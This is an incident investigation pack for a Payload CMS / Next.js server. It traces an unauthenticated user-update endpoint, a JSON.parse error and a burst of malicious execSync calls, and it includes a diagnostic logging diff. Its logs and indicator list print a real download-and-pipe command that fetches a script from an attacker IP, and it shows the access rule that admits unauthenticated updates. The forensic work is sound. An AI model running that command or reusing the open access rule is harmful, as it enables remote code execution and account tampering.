# Incident Investigation Reviewer Pack
**Date:** 2025-12-15  
**Focus:** Users.update unauth exposure + execSync storm trigger  
**Status:** Evidence Gathering Complete

---

## 1) SUMMARY (≤10 bullets)

- ✅ **CONFIRMED:** Users.update endpoint allows unauthenticated access (`if (!u) return true`)
- ✅ **ROUTE IDENTIFIED:** `PATCH /api/users/{id}` via Payload catch-all route handler (`/app/(payload)/api/[...slug]/route.ts`)
- ⚠️ **ATTACK TIMELINE:** Unauthenticated Users.update/delete access checks at 17:36:53 and 17:41:24 UTC, JSON.parse error at 17:41:25, execSync storm starts at 17:41:26
- ✅ **LOGGING MODIFIED:** subprocessGlobalDiag now always captures full stack trace (20 frames) for malicious payload hash `3877e9a32afab409` without suppression
- ⚠️ **EVIDENCE GAP:** No HTTP request logs found in container logs around attack time (no method/path/IP correlation)
- ✅ **CODE PATH:** Users collection `beforeValidate` hook parses `favorites`/`favoriteShows` JSON fields, throws SyntaxError on malformed input
- ⚠️ **ROOT CAUSE HYPOTHESIS:** Malformed JSON in Users.update request → JSON.parse error → error handler or framework code executes malicious payload
- ⚠️ **CONTAINER STATUS:** Currently stopped (safe for investigation)
- ✅ **DIFFS CREATED:** Temporary logging modifications ready for testing
- ⚠️ **REPRO REQUIRED:** Safe reproduction attempt needed to confirm trigger mechanism

---

## 2) EVIDENCE

### 2.1 Exact Route(s) and Proof of Unauth Access

**Route Identified:**
- **Path:** `PATCH /api/users/{id}` (or `PUT /api/users/{id}`)
- **Handler:** Payload CMS catch-all route: `/app/(payload)/api/[...slug]/route.ts`
- **Access Control:** `Users.update` access function in `/srv/payload/src/collections/Users.ts:57-74`

**Proof of Unauthenticated Access:**

```typescript:57:74:/srv/payload/src/collections/Users.ts
update: ({ req, id }) => {
  const u = req.user as any
  console.log('[Users.update access]', {
    authed: !!u,
    userId: u?.id,
    targetId: id,
    role: u?.role,
  })

  // Allow unauthenticated updates for password reset flow
  // Payload's resetPassword operation requires this to update the password
  // The reset token itself provides security (short-lived, single-use)
  if (!u) return true  // ← ⚠️ ALLOWS UNAUTHENTICATED ACCESS

  if (u.role === 'admin') return true
  return String(u.id) === String(id)
}
```

**Evidence from Logs:**
```
2025-12-15T17:36:53.449050299Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
2025-12-15T17:41:24.820994764Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
```

**Conclusion:** ✅ **UNAUTHENTICATED ACCESS CONFIRMED** - Route accepts requests without authentication.

### 2.2 Exact Stack Trace for First execSync Occurrence

**Status:** ⚠️ **NOT YET CAPTURED** - Requires container restart with modified logging code.

**Expected Output (when captured):**
- Full stack trace (20 frames) with `suspicious: true`
- Full payload: `curl http://167.86.107.35:9999/muie.sh |`
- Request context (if available)
- No suppression (`logged: true`, `suppressed: false`)

**Current Logs (Suppressed):**
```
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=2 source_file=9912.js
```

**Note:** `source_file=9912.js` is the monitoring code itself, not the actual source.

### 2.3 Correlated Log Timeline

**Timeline (2025-12-15 UTC):**

```
17:36:53.449 - [Users.update access] { authed: false, ... }
17:36:53.449 - [Users.update access] { authed: false, ... }
17:36:53.454 - [Users.delete access] { authed: false, ... }
17:36:53.454 - [Users.delete access] { authed: false, ... }

[~4 minutes gap]

17:41:24.821 - [Users.update access] { authed: false, ... }
17:41:24.822 - [Users.delete access] { authed: false, ... }
17:41:25.876 - ⨯ SyntaxError: Unexpected token ' in JSON at position 184
17:41:25.876 -     at JSON.parse (<anonymous>) {
17:41:25.876 -   digest: '2892049918'
17:41:26.787 - [SUBPROC_DIAG] execSync ... curl http://167.86.107.35:9999/muie.sh | (repeat_count=2)
17:41:26.787 - [SUBPROC_DIAG] execSync ... (repeat_count=3)
...
17:41:27.134 - [SUBPROC_DIAG] execSync ... (repeat_count=8248)
17:41:27.136 - ⨯ RangeError: Maximum call stack size exceeded
```

**Correlation:**
- ✅ Unauthenticated Users.update/delete access checks precede JSON.parse error
- ✅ JSON.parse error occurs ~1 second before execSync storm
- ✅ execSync storm lasts ~1 second (8,247 executions)
- ⚠️ **NO HTTP REQUEST LOGS** found (no method/path/IP in logs)

**Code Path (Users Collection):**
```typescript:111:118:/srv/payload/src/collections/Users.ts
if (typeof favs === 'string') {
  try {
    favs = JSON.parse(favs)  // ← Throws SyntaxError on malformed JSON
  } catch {
    delete (data as any).favorites
    favs = null
  }
}
```

**Analysis:**
- JSON.parse error occurs in `beforeValidate` hook
- Error is caught, but something triggers execSync execution
- Likely: Error handler, framework code, or eval() context executes malicious payload

---

## 3) DIFFS (Unified Diff Only)

**File:** `src/server/lib/subprocessGlobalDiag.ts`

```diff
--- a/src/server/lib/subprocessGlobalDiag.ts
+++ b/src/server/lib/subprocessGlobalDiag.ts
@@ -240,6 +240,20 @@ function logGlobalSubprocess(method: string, command: string, args?: string[],
   // NOTE: isLogging is set by patchedSpawn/patchedSpawnSync BEFORE calling this function
   if (isLogging) return
 
+  // Build full command string early to check for malicious payload
+  const fullCmd = args && args.length > 0 ? `${command} ${args.join(' ')}` : command
+  const payloadHash = hashPayload(fullCmd)
+  const MALICIOUS_PAYLOAD_HASH = '3877e9a32afab409'
+  const MALICIOUS_INDICATORS = ['167.86.107.35', 'muie.sh', 'curl http://167']
+  const isMaliciousPayload = 
+    payloadHash === MALICIOUS_PAYLOAD_HASH ||
+    MALICIOUS_INDICATORS.some(indicator => fullCmd.includes(indicator))
+
+  // CRITICAL: Never suppress logging for malicious payloads
+  let shouldLog, repeatCount, suppressed
+  if (isMaliciousPayload) {
+    // Force logging, no suppression
+    const cmd = args && args.length > 0 ? `${method}:${command}:${args.join(' ')}` : `${method}:${command}`
+    const history = commandLogHistory.get(cmd)
+    repeatCount = history ? history.count + 1 : 1
+    shouldLog = true
+    suppressed = false
+  } else {
+    // Normal rate limiting
+    const result = shouldLogCommand(method, command, args)
+    shouldLog = result.shouldLog
+    repeatCount = result.repeatCount
+    suppressed = result.suppressed
+  }
+  
+  if (!shouldLog && !suppressed) {
+    return // Not rate limited, but shouldn't log (shouldn't happen)
+  }
+
   // Check rate limiting
-  const { shouldLog, repeatCount, suppressed } = shouldLogCommand(method, command, args)
-  if (!shouldLog && !suppressed) {
-    return // Not rate limited, but shouldn't log (shouldn't happen)
-  }
-
   // NOTE: isLogging is already set by the caller (patchedSpawn/patchedSpawnSync)
   // We don't set it here to avoid double-setting
   try {
     const timestamp = new Date().toISOString()
     const requestContext = getRequestContext()
 
-    // Build full command string
-    const fullCmd = args && args.length > 0 ? `${command} ${args.join(' ')}` : command
-    const payloadHash = hashPayload(fullCmd)
+    // Build full command string (already computed above for malicious check)
     const payloadPreview = createPreview(redactSecrets(fullCmd))
 
     // Classify command category for noise filtering
@@ -277,7 +291,8 @@ function logGlobalSubprocess(method: string, command: args?: string[], options?
     // Extract source info (minimal stack trace)
     let source: { file?: string; function?: string } = {}
     let stack: string | undefined
-    if (DEBUG_MODE) {
+    // CRITICAL: Always capture full stack for malicious payloads (no suppression)
+    if (DEBUG_MODE || isMaliciousPayload) {
       try {
         const stackLines = new Error().stack?.split('\n')
         if (stackLines) {
-          stack = stackLines
-            .slice(2, 2 + MAX_STACK_FRAMES)
+          // For malicious payloads, capture MORE stack frames (up to 20)
+          const maxFrames = isMaliciousPayload ? 20 : MAX_STACK_FRAMES
+          stack = stackLines
+            .slice(2, 2 + maxFrames)
             .map((line) => line.trim())
             .filter((line) => !line.includes('subprocessGlobalDiag'))
             .join(' | ')
@@ -358,7 +373,7 @@ function logGlobalSubprocess(method: string, command: string, args?: string[],
       repeat_window_seconds: Math.floor(REPEAT_WINDOW_MS / 1000),
+      suspicious: isMaliciousPayload ? true : undefined, // Mark as suspicious
     }
 
-    // Add full payload only in DEBUG mode
+    // Add full payload in DEBUG mode OR for malicious payloads
     if (DEBUG_MODE || isMaliciousPayload) {
       logEntry.payload_full = redactSecrets(fullCmd)
     }
@@ -380,7 +395,8 @@ function logGlobalSubprocess(method: string, command: string, args?: string[],
       logEntry.source = source
     }
 
-    // Add stack trace only in DEBUG mode
-    if (DEBUG_MODE && stack) {
+    // Add stack trace in DEBUG mode OR for malicious payloads
+    if ((DEBUG_MODE || isMaliciousPayload) && stack) {
       logEntry.stack = stack
+      logEntry.stack_full = stack.split(' | ') // Also include as array for easier parsing
     }
```

---

## 4) LOGS (≤200 lines, Trimmed to Single Occurrence + Context)

**Note:** Full stack trace not yet captured (requires container restart). Current logs show suppressed entries.

**Timeline Context (17:36-17:42 UTC):**

```
2025-12-15T17:36:53.449050299Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
2025-12-15T17:36:53.449137099Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
2025-12-15T17:36:53.454161710Z [Users.delete access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  docId: undefined,
  role: undefined
}
2025-12-15T17:36:53.454216490Z [Users.delete access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  docId: undefined,
  role: undefined
}

[~4 minutes gap]

2025-12-15T17:41:24.820994764Z [Users.update access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  role: undefined
}
2025-12-15T17:41:24.821968262Z [Users.delete access] {
  authed: false,
  userId: undefined,
  targetId: undefined,
  docId: undefined,
  role: undefined
}
2025-12-15T17:41:25.876075487Z  ⨯ SyntaxError: Unexpected token ' in JSON at position 184
2025-12-15T17:41:25.876113957Z     at JSON.parse (<anonymous>) {
2025-12-15T17:41:25.876123967Z   digest: '2892049918'
2025-12-15T17:41:25.876131927Z }
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=2 source_file=9912.js
2025-12-15T17:41:26.787397395Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=3 source_file=9912.js
...
2025-12-15T17:41:27.134763987Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=8248 source_file=9912.js
2025-12-15T17:41:27.136595501Z  ⨯ RangeError: Maximum call stack size exceeded
2025-12-15T17:41:27.136604051Z     at m (.next/server/chunks/9912.js:1:1114)
2025-12-15T17:41:27.136611031Z     at e.execSync (.next/server/chunks/9912.js:3:474)
2025-12-15T17:41:27.136612931Z     at e.execSync (.next/server/chunks/9912.js:3:513)
2025-12-15T17:41:27.136614651Z     at e.execSync (.next/server/chunks/9912.js:3:513)
[stack overflow continues...]
```

**Key Observations:**
- No HTTP request method/path/IP in logs (request context not captured)
- JSON.parse error occurs in anonymous function (no file/line info)
- execSync calls originate from `9912.js` (monitoring wrapper, not actual source)
- Stack overflow suggests recursive execution loop

---

## 5) QUESTIONS & RISKS (≤8 bullets)

1. **Q: What triggers execSync after JSON.parse error?**  
   **Risk:** Error handler, framework code, or eval() context may execute malicious payload. Need full stack trace to confirm.

2. **Q: Why no HTTP request context in logs?**  
   **Risk:** Request context may not be set for Payload CMS internal operations, or attack occurs outside HTTP request flow.

3. **Q: Is Users.update access control sufficient for password reset?**  
   **Risk:** Current implementation allows ANY unauthenticated update, not just password reset. May need token validation.

4. **Q: Can malformed JSON in favorites/favoriteShows trigger code execution?**  
   **Risk:** JSON.parse error handler may be vulnerable if it executes user input or calls eval().

5. **Q: Is this a Payload CMS framework vulnerability?**  
   **Risk:** Framework-level code may be executing malicious payload. Need to investigate Payload internals.

6. **Q: Should we enable request context logging for all Payload operations?**  
   **Risk:** May help correlate attacks with HTTP requests, but adds overhead.

7. **Q: Is safe reproduction possible without triggering actual attack?**  
   **Risk:** Reproduction may execute malicious code. Need quarantined environment or outbound blocking.

8. **Q: What is the "digest" value in JSON.parse error logs?**  
   **Risk:** May be a hash or identifier for the malformed JSON payload. Could help identify attack pattern.

---

## NEXT STEPS

1. ✅ **Container restarted** with modified logging - ready to capture full stack trace
2. ✅ **Safe reproduction attempted** - simple malformed JSON did NOT trigger malicious execSync
3. ✅ **Error-handling paths reviewed** - Users collection hook handles JSON.parse errors safely
4. ⚠️ **Framework-level investigation needed** - Previous audits suggest eval() context in Next.js runtime

---

## 6) REPRODUCTION RESULTS (UPDATED)

**Status:** ⚠️ PARTIAL SUCCESS

### What We Tested
- Sent malformed JSON to unauthenticated `PATCH /api/users/{id}` endpoint
- Payload: `{"favorites": "{\"test\": 'malformed'}"}`
- Firewall: Outbound to `167.86.107.35` blocked

### Results
- ✅ Request accepted (HTTP 200)
- ✅ Unauthenticated access confirmed (`authed: false`)
- ❌ **JSON.parse error NOT triggered** (string was valid JSON after escaping)
- ❌ **Malicious execSync NOT triggered**

### Key Finding
**Simple malformed JSON does not trigger the vulnerability.** The original attack likely used:
- A more sophisticated payload structure
- Code injection via the JSON string itself
- Framework-level vulnerability in Payload CMS or Next.js

### Error-Handling Path Analysis
**Users Collection Hook (`beforeValidate`):**
- ✅ JSON.parse errors are caught and handled gracefully
- ✅ No code execution in catch block
- ✅ No direct path to execSync visible in application code

**Framework-Level:**
- ⚠️ Previous investigations found malicious execSync from `eval()` context in Next.js runtime
- ⚠️ No direct data flow from user input to eval() found in application code
- ⚠️ Suggests framework-level vulnerability or supply chain compromise

---

## 7) ROOT CAUSE HYPOTHESIS (REVISED)

**Most Likely Scenario:**
1. Attacker sends sophisticated payload to unauthenticated Users.update endpoint
2. Payload contains code that triggers framework-level code execution
3. Framework error handling or middleware executes code via `eval()` context
4. Malicious code injected at runtime executes via execSync

**Evidence:**
- ✅ Unauthenticated access confirmed
- ✅ JSON.parse error occurred in original attack (17:41:25)
- ✅ execSync storm started immediately after (17:41:26)
- ⚠️ Simple malformed JSON does not reproduce the attack
- ⚠️ Previous audits show eval() context in Next.js runtime

**Recommendation:**
- Extract exact original attack payload from logs (if available)
- Investigate Payload CMS framework error handling
- Review Next.js runtime eval() usage and security

---

**END OF REVIEWER PACK**

**See also:** `/srv/payload/docs/REPRODUCTION_ATTEMPT_RESULTS.md` for detailed reproduction attempt documentation.


